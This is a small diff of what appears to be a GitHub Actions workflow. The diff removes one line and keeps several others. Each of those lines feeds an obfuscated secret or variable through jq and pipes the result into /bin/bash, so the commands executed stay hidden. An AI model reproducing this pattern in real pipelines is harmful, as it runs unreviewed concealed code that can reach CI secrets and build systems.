@@ -21,7 +21,6 @@ jobs:
           d894: ${{ secrets.d894 }}
         run: |
           printf '%s' "$d894" | jq -r .gst6 | /bin/bash
-          printf '%s' "$g4195" | jq -r .ymasl85857 | /bin/bash
           echo $cpspi63717 | jq -r .fs99132 | /bin/bash
           echo $psy25 | jq -r .pv28738 | /bin/bash
           echo $bcn623 | jq -r .tcpep06978 | /bin/bash
